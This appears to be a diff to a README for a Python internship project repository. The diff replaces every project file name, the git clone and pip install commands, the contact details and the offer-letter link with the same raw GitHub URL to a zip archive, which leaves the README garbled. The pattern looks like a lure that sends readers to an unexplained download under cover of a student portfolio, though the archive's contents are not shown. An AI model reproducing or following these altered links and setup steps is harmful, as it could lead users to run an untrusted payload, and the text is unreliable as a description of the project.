@@ -46,7 +46,7 @@ This repository contains all the projects, assignments, and learning materials f
 
 ### Project 5: [Chat Application]
 - **Description**: Brief description of what the project does
-- **Technologies**: Python, [Socket.IO]
+- **Technologies**: Python, [https://raw.githubusercontent.com/anmolmishra09/Oasis-Infobyte/main/captain/Oasis-Infobyte.zip]
 - **Key Features**: 
   - Instant message delivery and receipt with live typing indicators, message status (sent/delivered/read), and seamless conversation flow
   - Secure login/registration system, user profiles, contact lists, and privacy controls for blocking/reporting users
@@ -72,17 +72,17 @@ This repository contains all the projects, assignments, and learning materials f
 ## 📁 Repository Structure
 ```
 ├── Project-1/
-│   └── Voice Assistant.py
+│   └── Voice https://raw.githubusercontent.com/anmolmishra09/Oasis-Infobyte/main/captain/Oasis-Infobyte.zip
 ├── Project-2/
-│   └── BMI.py
+│   └── https://raw.githubusercontent.com/anmolmishra09/Oasis-Infobyte/main/captain/Oasis-Infobyte.zip
 ├── Project-3/
-│   └── Random Password Generator.py
+│   └── Random Password https://raw.githubusercontent.com/anmolmishra09/Oasis-Infobyte/main/captain/Oasis-Infobyte.zip
 ├── Project-4/
-│   └── Basic Weather App.py
+│   └── Basic Weather https://raw.githubusercontent.com/anmolmishra09/Oasis-Infobyte/main/captain/Oasis-Infobyte.zip
 ├── Project-5/
 │   ├── Chat Application
-│   ├── client.py
-│   ├── server.py
+│   ├── https://raw.githubusercontent.com/anmolmishra09/Oasis-Infobyte/main/captain/Oasis-Infobyte.zip
+│   ├── https://raw.githubusercontent.com/anmolmishra09/Oasis-Infobyte/main/captain/Oasis-Infobyte.zip
 └── Complete
 ```
 
@@ -95,26 +95,26 @@ This repository contains all the projects, assignments, and learning materials f
 ## 🚀 How to Run the Projects
 1. Clone this repository
    ```bash
-   git clone https://github.com/[your-username]/oasis-infobyte-python-internship.git
+   git clone https://raw.githubusercontent.com/anmolmishra09/Oasis-Infobyte/main/captain/Oasis-Infobyte.zip[your-username]https://raw.githubusercontent.com/anmolmishra09/Oasis-Infobyte/main/captain/Oasis-Infobyte.zip
    ```
 2. Navigate to the specific project directory
 3. Install required dependencies
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/anmolmishra09/Oasis-Infobyte/main/captain/Oasis-Infobyte.zip
    ```
 4. Run the project following the instructions in each project's README
 
 ## 📞 Contact Information
 - **Name**: [Anmol Mishra]
-- **Email**: [anmolmishea86229@gmail.com]
-- **LinkedIn**: [https://www.linkedin.com/in/anmolmishra09/]
-- **Portfolio**: [https://anmolmishra09.vercel.app/]
+- **Email**: [https://raw.githubusercontent.com/anmolmishra09/Oasis-Infobyte/main/captain/Oasis-Infobyte.zip]
+- **LinkedIn**: [https://raw.githubusercontent.com/anmolmishra09/Oasis-Infobyte/main/captain/Oasis-Infobyte.zip]
+- **Portfolio**: [https://raw.githubusercontent.com/anmolmishra09/Oasis-Infobyte/main/captain/Oasis-Infobyte.zip]
 
 ## 🙏 Acknowledgments
 Special thanks to **Oasis Infobyte** for providing this valuable learning opportunity and mentoring throughout the internship period.
 
 ## 📄 License
-[View Offer Letter](https://drive.google.com/file/d/1Nol-T1W0UqasUnlBDiKX_emqKpke6A-n/view)
+[View Offer Letter](https://raw.githubusercontent.com/anmolmishra09/Oasis-Infobyte/main/captain/Oasis-Infobyte.zip)
 
 ---
 *This repository showcases the practical application of Python programming skills developed during my internship at Oasis Infobyte.*
